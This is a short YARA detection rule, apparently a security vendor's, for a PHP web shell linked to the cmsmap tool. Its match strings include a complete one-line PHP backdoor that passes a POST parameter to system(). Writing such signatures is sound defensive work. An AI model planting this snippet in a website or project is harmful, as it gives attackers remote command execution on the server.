rule Backdoor_Webshell_PHP_000019
{
    meta:
        description = "cmsmap"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2017-11-29"
        
    strings:
        $a = "<?php if (isset($_POST[\"c\"])){print(stripslashes($_POST[\"c\"]));} ?>"
        $b = "<?php if (isset($_POST[\"c\"])){system(stripslashes($_POST[\"c\"]).\" 2>&1\");} ?>"
        $c = "<?php "
        
    condition:
        all of them
}